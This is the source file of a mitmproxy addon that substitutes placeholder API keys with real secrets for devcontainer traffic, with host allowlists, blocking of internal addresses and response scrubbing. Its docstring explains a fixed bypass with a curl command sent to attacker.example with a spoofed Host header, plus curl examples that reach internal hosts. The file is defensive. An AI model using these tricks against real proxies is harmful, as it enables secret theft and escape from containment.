"""
desolate-proxy: transparent secret-substitution addon for mitmproxy.

Config lives at /etc/desolate-proxy/settings.json (override with DESOLATE_SETTINGS).
Secrets are keyed by their PLACEHOLDER NAME, which is exactly the string your
devcontainers put in .env files:

    .env inside devcontainer:   OPENAI_API_KEY=MY-AWESOME-PROJECT-OPENAI-KEY
    settings.json in the VM:    "MY-AWESOME-PROJECT-OPENAI-KEY":
                                    {"value": "sk-...", "hosts": ["api.openai.com"]}

Behavior per request:
  0. Refuse any request whose destination ADDRESS is internal (see below).
  1. Establish the PROVEN destination (see below).
  2. Network policy (ordered allow/deny rules, first match wins).
  3. Scan URL + headers + body for any configured placeholder.
  4. If a placeholder is found but the proven destination is NOT in that
     secret's allowlist -> block 403 (leak detection / honeypot defense).
  5. Otherwise substitute every occurrence with the real value.
  6. On responses, scrub real values back to placeholders so a secret can
     never enter the container even if an endpoint echoes it.

Redirect safety falls out of the model: substitution is decided per-request,
so a redirect to an unlisted host receives the placeholder, which trips rule 4.

---------------------------------------------------------------------------
WHY "PROVEN DESTINATION" AND NOT THE HOST HEADER
---------------------------------------------------------------------------
mitmproxy's `request.pretty_host` prefers the Host header, which the CLIENT
sends. In transparent mode the client also chooses the IP it connects to, and
those two are independent. Deciding on the Host header was therefore a total
bypass of this whole design, over plain HTTP *and* over TLS:

    curl http://attacker.example/  -H 'Host: api.openai.com' \
                                   -H 'Authorization: Bearer MYAPP-OPENAI-KEY'

The addon saw "api.openai.com", found it allowlisted, substituted the real key
-- and mitmproxy delivered it to the original destination, i.e. the attacker.
Any code in any devcontainer could harvest every configured secret this way.

So the destination is taken from the TLS SNI, which is bound to the connection
that will actually carry the request, and the Host header must MATCH it. An
attacker who instead sets SNI=api.openai.com toward their own IP cannot
complete the handshake: mitmproxy verifies the upstream certificate against
that name.

Plain HTTP has no SNI and therefore no provable destination at all. Requests
that carry a placeholder over plaintext are refused rather than guessed at.

---------------------------------------------------------------------------
WHY INTERNAL DESTINATIONS ARE REFUSED BEFORE ANYTHING ELSE
---------------------------------------------------------------------------
nftables REDIRECTs every :80 and :443 from the container bridges here,
whatever the destination address was. This proxy then dials that destination
from the VM -- where the source is no longer a container bridge, so neither
the forward default-deny nor the input drop applies to it. That makes this
process a confused deputy: the one component standing on both sides of the
containment boundary.

    curl http://192.168.5.2/     # the Mac, over Colima's vmnet
    curl http://172.17.0.2/      # a container on another docker bridge

Both were redirected here and both were forwarded, because the network policy
matches on a NAME (fnmatch) and the shipped default is {"host": "*"} -- which
an IP literal matches. A name check cannot fix this on its own either: a
public hostname whose A record points at 127.0.0.1 or 10.x satisfies any
allowlist (DNS rebinding). So the check below is on the ADDRESS, and it runs
before the name is consulted at all.

Set "allow_private_destinations": true in settings.json only if you are
deliberately proxying to something on the LAN, and understand that it removes
the wall for :80/:443.
"""

import fnmatch
import ipaddress
import json
import logging
import os

from mitmproxy import http

SETTINGS_PATH = os.environ.get("DESOLATE_SETTINGS", "/etc/desolate-proxy/settings.json")
MAX_BODY = 5 * 1024 * 1024  # skip substitution/scrubbing in bodies larger than this
MIN_PLACEHOLDER_LEN = 12    # shorter placeholders risk accidental substring matches

# stdlib logging, not ctx.log: ctx.log is deprecated and its removal would raise
# inside the request hook -- and mitmproxy answers an addon exception by letting
# the request through. That fail-open is exactly what this file must not do.
log = logging.getLogger("desolate-proxy")


class DesolateProxy:
    def __init__(self):
        self._mtime = None
        self.secrets = {}          # placeholder -> {"value": str, "hosts": [glob...]}
        self.network = []          # [{"action","host","method"?}, ...]
        self.default_action = "allow"
        self.scrub_responses = True
        self.tls_passthrough = []  # SNI globs to tunnel without interception
        self.allow_private_destinations = False

    # ---------- config ----------

    def _maybe_reload(self):
        try:
            mtime = os.stat(SETTINGS_PATH).st_mtime
        except FileNotFoundError:
            if self._mtime is not None:
                log.error(f"settings file missing: {SETTINGS_PATH}; keeping last config")
            return
        if mtime == self._mtime:
            return
        try:
            with open(SETTINGS_PATH) as f:
                cfg = json.load(f)
        except (json.JSONDecodeError, OSError) as e:
            log.error(f"failed to load {SETTINGS_PATH}: {e}; keeping last config")
            return

        secrets = {}
        for name, entry in cfg.get("secrets", {}).items():
            value = entry.get("value", "")
            hosts = entry.get("hosts", [])
            if not value:
                log.warning(f"secret {name!r} has empty value; skipping")
                continue
            if not hosts:
                log.warning(f"secret {name!r} has no hosts allowlist; skipping (refusing wildcard-by-omission)")
                continue
            if len(name) < MIN_PLACEHOLDER_LEN:
                log.warning(f"placeholder {name!r} is short (<{MIN_PLACEHOLDER_LEN} chars); "
                            f"substring collisions possible")
            secrets[name] = {"value": value, "hosts": [h.lower() for h in hosts]}

        self.secrets = secrets
        self.network = cfg.get("network", [])
        self.default_action = cfg.get("default_action", "allow")
        self.scrub_responses = cfg.get("scrub_responses", True)
        self.tls_passthrough = [h.lower() for h in cfg.get("tls_passthrough", [])]
        self.allow_private_destinations = bool(cfg.get("allow_private_destinations", False))
        self._mtime = mtime
        log.info(f"loaded {len(self.secrets)} secret(s), {len(self.network)} network rule(s), "
                 f"default_action={self.default_action}, "
                 f"allow_private_destinations={self.allow_private_destinations}")

    # ---------- helpers ----------

    @staticmethod
    def _host_matches(host, patterns):
        host = (host or "").lower()
        return any(fnmatch.fnmatch(host, p) for p in patterns)

    @staticmethod
    def proven_host(flow):
        """The destination this connection can be PROVEN to be talking to.

        The TLS SNI, and only the TLS SNI. It is bound to the handshake that
        mitmproxy validates the upstream certificate against, so a client
        cannot claim a name it does not control. Returns None for plaintext
        HTTP, where no such proof exists.
        """
        sni = getattr(flow.client_conn, "sni", None)
        return sni.lower() if sni else None

    @staticmethod
    def destination_address(flow):
        """The address this connection actually goes to, or None if not an IP.

        Ordered, and the FIRST thing that parses as an IP literal wins. In
        transparent mode `request.host` IS the original destination for
        plaintext, which is the case that matters most; for TLS mitmproxy fills
        it from the SNI instead, so that falls through to the connection's own
        addresses. Anything that does not parse is a name, not a destination we
        can judge here, and is skipped rather than guessed at.
        """
        candidates = [getattr(flow.request, "host", None)]
        conn = getattr(flow, "server_conn", None)
        for attribute in ("peername", "address"):
            value = getattr(conn, attribute, None) if conn is not None else None
            if isinstance(value, (tuple, list)) and value:
                candidates.append(value[0])

        for candidate in candidates:
            if not isinstance(candidate, str) or not candidate:
                continue
            try:
                return ipaddress.ip_address(candidate.strip("[]"))
            except ValueError:
                continue
        return None

    @staticmethod
    def is_internal(address):
        """Whether a container must never be able to reach this address.

        `is_global` is deliberately not the test: it also excludes shared
        address space and assorted reserved ranges that are not part of this
        boundary. What matters here is the VM, the Mac over Colima's vmnet, the
        LAN, the other docker bridges, and the cloud metadata endpoint.
        """
        if address is None:
            return False
        return (address.is_private or address.is_loopback or address.is_link_local
                or address.is_multicast or address.is_reserved
                or address.is_unspecified)

    @staticmethod
    def host_header(flow):
        """The Host / :authority the client CLAIMED, minus any port. Untrusted."""
        raw = flow.request.host_header
        if not raw:
            return None
        raw = raw.strip()
        if raw.startswith("["):                 # [::1]:443
            return raw.split("]", 1)[0][1:].lower()
        if raw.count(":") == 1:                 # host:port (never a bare IPv6)
            raw = raw.rsplit(":", 1)[0]
        return raw.lower()

    def _network_allowed(self, host, method):
        for rule in self.network:
            if not self._host_matches(host, [str(rule.get("host", "*")).lower()]):
                continue
            m = rule.get("method")
            if m and m.upper() != method.upper():
                continue
            return rule.get("action", "deny") == "allow"
        return self.default_action == "allow"

    @staticmethod
    def _block(flow, code, msg):
        flow.response = http.Response.make(
            code, f"desolate-proxy: {msg}\n".encode(), {"content-type": "text/plain"}
        )

    def _placeholders_in_request(self, flow):
        """Return the set of configured placeholder names present anywhere in the request."""
        found = set()
        url = flow.request.url
        header_blob = "\n".join(f"{k}: {v}" for k, v in flow.request.headers.items(multi=True))
        body = flow.request.raw_content or b""
        body_search = body if len(body) <= MAX_BODY else b""
        for name in self.secrets:
            if name in url or name in header_blob or name.encode() in body_search:
                found.add(name)
        return found

    # ---------- mitmproxy hooks ----------

    def tls_clienthello(self, data):
        try:
            self._maybe_reload()
            sni = (data.client_hello.sni or "").lower()
            if sni and self._host_matches(sni, self.tls_passthrough):
                data.ignore_connection = True  # tunnel raw; no interception, no substitution
        except Exception:
            log.exception("tls_clienthello failed; not passing through")

    def request(self, flow: http.HTTPFlow):
        # Everything below is wrapped: mitmproxy responds to an uncaught addon
        # exception by forwarding the request unmodified, which would silently
        # disable secret policy while traffic keeps flowing. Fail closed.
        try:
            self._request(flow)
        except Exception:
            log.exception("desolate-proxy addon error; blocking request (fail-closed)")
            self._block(flow, 502, "internal policy error; request refused")

    def _request(self, flow: http.HTTPFlow):
        self._maybe_reload()
        method = flow.request.method
        proven = self.proven_host(flow)
        claimed = self.host_header(flow)

        # 0) destination address -- BEFORE the name is consulted, because the
        # name is the part an attacker chooses. See the module header.
        if not self.allow_private_destinations:
            destination = self.destination_address(flow)
            if self.is_internal(destination):
                log.warning(f"DENY  {method} -> {destination} (internal destination; "
                            f"claimed {claimed!r}, sni {proven!r})")
                self._block(flow, 403,
                            f"destination {destination} is internal to the host; "
                            f"containers may not reach it through this proxy")
                return

        # 1) network policy -- on the proven name where we have one.
        policy_host = proven or claimed or flow.request.host
        if not self._network_allowed(policy_host, method):
            log.warning(f"DENY  {method} {policy_host}{flow.request.path} (network policy)")
            self._block(flow, 403, f"network policy denied {method} {policy_host}")
            return

        # 2) leak detection -- strictly on the proven name.
        found = self._placeholders_in_request(flow)
        if found:
            if proven is None:
                log.warning(f"LEAK  placeholder(s) {sorted(found)} sent over PLAINTEXT to "
                            f"{flow.request.host!r} (claimed {claimed!r}) -- blocked")
                self._block(flow, 403,
                            f"secret {sorted(found)} may not be sent over plaintext HTTP "
                            f"(no verifiable destination); use https")
                return
            if claimed is not None and claimed != proven:
                log.warning(f"LEAK  Host header {claimed!r} does not match TLS SNI {proven!r} "
                            f"while carrying {sorted(found)} -- blocked")
                self._block(flow, 403,
                            f"Host header '{claimed}' does not match the TLS destination "
                            f"'{proven}'; refusing to substitute a secret")
                return
            for name in sorted(found):
                if not self._host_matches(proven, self.secrets[name]["hosts"]):
                    log.warning(f"LEAK  placeholder {name!r} sent toward {proven!r} "
                                f"(allowed: {self.secrets[name]['hosts']}) -- blocked")
                    self._block(flow, 403, f"secret {name} is not permitted for host {proven}")
                    return

        # 3) substitution
        for name in found:
            value = self.secrets[name]["value"]
            # .path, NOT .url -- and this is load-bearing, not style.
            #
            # Assigning flow.request.url re-parses it into scheme/host/port/path
            # and, as a side effect, REWRITES THE HOST HEADER to whatever host
            # the URL names. In transparent mode request.host is the destination
            # IP, so `request.url = request.url` -- a byte-identical assignment,
            # which is what this was when the placeholder lived in a header
            # rather than the URL -- silently replaced `Host: api.openai.com`
            # with `Host: 162.159.140.245`. The upstream CDN then has no idea
            # which site is being addressed and answers with an HTML 403 that
            # mentions neither the header nor us.
            #
            # It only bit once a secret was actually registered, because this
            # loop does not run otherwise: without the secret the request went
            # out intact and returned a truthful 401.
            #
            # request.path covers path AND query string, which is the only part
            # of a URL a placeholder can realistically appear in, and assigning
            # it leaves host and headers alone.
            if name in flow.request.path:
                flow.request.path = flow.request.path.replace(name, value)
            for k, v in list(flow.request.headers.items(multi=True)):
                if name in v:
                    flow.request.headers[k] = v.replace(name, value)
            body = flow.request.raw_content or b""
            if body and len(body) <= MAX_BODY and name.encode() in body:
                # .content (not .raw_content) so Content-Length / encodings stay correct
                flow.request.content = flow.request.content.replace(name.encode(), value.encode())

        if found:
            log.info(f"SUBST {method} {proven}{flow.request.path} <- {sorted(found)}")

    def response(self, flow: http.HTTPFlow):
        try:
            self._response(flow)
        except Exception:
            # A scrub failure must not leak the response through unscrubbed.
            log.exception("desolate-proxy response scrub failed; blocking response (fail-closed)")
            self._block(flow, 502, "internal policy error; response withheld")

    def _response(self, flow: http.HTTPFlow):
        if not self.scrub_responses or not flow.response:
            return
        for name, entry in self.secrets.items():
            value, bvalue = entry["value"], entry["value"].encode()
            for k, v in list(flow.response.headers.items(multi=True)):
                if value in v:
                    flow.response.headers[k] = v.replace(value, name)
            body = flow.response.raw_content or b""
            if body and len(body) <= MAX_BODY and bvalue in body:
                flow.response.content = flow.response.content.replace(bvalue, name.encode())
                log.warning(f"SCRUB response from {flow.request.pretty_host} echoed secret "
                            f"{name!r}; replaced with placeholder")


addons = [DesolateProxy()]
